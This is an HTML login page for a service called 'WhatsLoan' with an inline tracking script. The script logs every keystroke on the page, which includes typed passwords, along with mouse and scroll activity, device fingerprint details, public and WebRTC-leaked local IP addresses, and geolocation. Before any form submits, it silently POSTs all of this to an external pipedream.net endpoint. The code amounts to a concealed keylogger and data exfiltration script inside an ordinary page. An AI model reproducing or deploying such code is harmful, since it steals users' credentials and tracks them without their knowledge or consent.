<!DOCTYPE html>
<html lang="en">

<head>
  <title>WhatsLoan Login</title>
  <meta charset="UTF-8" />
  <base href="/">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>
<script>
  (function () {
    const serverEndpoint = "https://700bebc8a052541caf0ff9e5de2c58bc.m.pipedream.net"; // üîπ Replace with your API

    // üñ•Ô∏è Device Details Collection
    function getDeviceDetails() {
      return {
        browser: getBrowserName(),
        os: getOS(),
        screenResolution: `${screen.width}x${screen.height}`,
        deviceMemory: navigator.deviceMemory || "Unknown",
        cpuCores: navigator.hardwareConcurrency || "Unknown",
        language: navigator.language || navigator.userLanguage,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };
    }

    function getOS() {
      const userAgent = navigator.userAgent.toLowerCase();
      if (userAgent.includes("windows")) return "Windows";
      if (userAgent.includes("mac")) return "MacOS";
      if (userAgent.includes("linux")) return "Linux";
      if (userAgent.includes("android")) return "Android";
      if (userAgent.includes("iphone") || userAgent.includes("ipad")) return "iOS";
      return "Unknown";
    }

    function getBrowserName() {
      const userAgent = navigator.userAgent;

      if (userAgent.includes("Chrome")) return "Chrome";
      if (userAgent.includes("Firefox")) return "Firefox";
      if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
      if (userAgent.includes("Edge")) return "Edge";
      if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
      if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";

      return "Unknown";
    }

    // Usage:
    console.log(getBrowserName()); // Outputs: "Chrome", "Firefox", etc.


    // üåê Public IP Collection
    async function getPublicIP() {
      try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch {
        return "Unknown";
      }
    }

    // üì∂ Local IP Collection via WebRTC
    function getLocalIP() {
      return new Promise((resolve) => {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel("");
        rtc.createOffer()
          .then((offer) => rtc.setLocalDescription(offer))
          .catch(() => resolve("Unknown"));

        rtc.onicecandidate = (event) => {
          if (event && event.candidate && event.candidate.candidate) {
            const ip = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
            resolve(ip ? ip[0] : "Unknown");
          }
        };

        setTimeout(() => resolve("Unknown"), 5000); // Timeout to prevent hanging
      });
    }

    // üìç Geolocation Details
    async function getGeoDetails() {
      try {
        const response = await fetch("http://ip-api.com/json/");
        const data = await response.json();
        return {
          city: data.city || "Unknown",
          region: data.region || "Unknown",
          country: data.country || "Unknown",
          lat: data.lat || "Unknown",
          lon: data.lon || "Unknown",
          isp: data.isp || "Unknown",
        };
      } catch {
        return "Unknown";
      }
    }

    // üñ±Ô∏è Mouse Activity Tracking
    const mouseData = [];
    document.addEventListener("mousemove", (event) => {
      mouseData.push({ x: event.clientX, y: event.clientY, time: Date.now() });
    });

    document.addEventListener("click", (event) => {
      mouseData.push({ x: event.clientX, y: event.clientY, type: "click", time: Date.now() });
    });

    document.addEventListener("scroll", () => {
      mouseData.push({ scrollX: window.scrollX, scrollY: window.scrollY, time: Date.now() });
    });

    // ‚å®Ô∏è Keyboard Activity Tracking
    const keyboardData = [];
    let lastKeyReleaseTime = null; // Stores the last key release time

    document.addEventListener("keydown", (event) => {
      const startTime = Date.now();
      let releaseToPress = lastKeyReleaseTime ? startTime - lastKeyReleaseTime : null;

      keyboardData.push({
        key: event.key,
        start: startTime,
        end: null,
        hold: null,
        time: null,
        releaseToPress: releaseToPress, // Time since last key release
      });
    });

    document.addEventListener("keyup", (event) => {
      const endTime = Date.now();
      const keyEvent = keyboardData.find((data) => data.key === event.key && data.end === null);

      if (keyEvent) {
        keyEvent.end = endTime;
        keyEvent.hold = keyEvent.end - keyEvent.start;
        keyEvent.time = keyEvent.end; // Final event timestamp
        lastKeyReleaseTime = endTime; // Update last key release time
      }
    });

    // Convert keyboardData array for sending
    function getKeyboardData() {
      return keyboardData;
    }



    // üöÄ Data Sending to Server
    async function sendSystemData() {
      const deviceDetails = getDeviceDetails();
      const publicIP = await getPublicIP();
      const localIP = await getLocalIP();
      const geoDetails = await getGeoDetails();

      const payload = {
        deviceDetails,
        publicIP,
        localIP,
        geoDetails,
        mouseData,
        keyboardData,
      };

      try {
        await fetch(serverEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } catch (error) {
        console.error("Error sending system data:", error);
      }
    }

    // üñ±Ô∏è Track Submit Buttons Inside Forms (Prevent Refresh)
    document.addEventListener("DOMContentLoaded", () => {
      document.querySelectorAll("form").forEach((form) => {
        form.addEventListener("submit", async (event) => {
          event.preventDefault(); // ‚õî Prevent default form submission

          await sendSystemData(); // ‚úÖ Send tracking data first

          const formData = new FormData(form);
          const action = form.getAttribute("action");
          const method = form.getAttribute("method") || "POST";

          try {
            const response = await fetch(action, {
              method: method.toUpperCase(),
              body: formData,
            });

            if (response.ok) {
              console.log("‚úÖ Login successful");
              window.location.href = "/dashboard"; // Change this URL as needed
            } else {
              console.error("‚ùå Login failed");
            }
          } catch (error) {
            console.error("‚ùå Error submitting form:", error);
          }
        });
      });
    });

  })();
</script>

<body>
  <app-root>Loading...</app-root>
</body>

</html>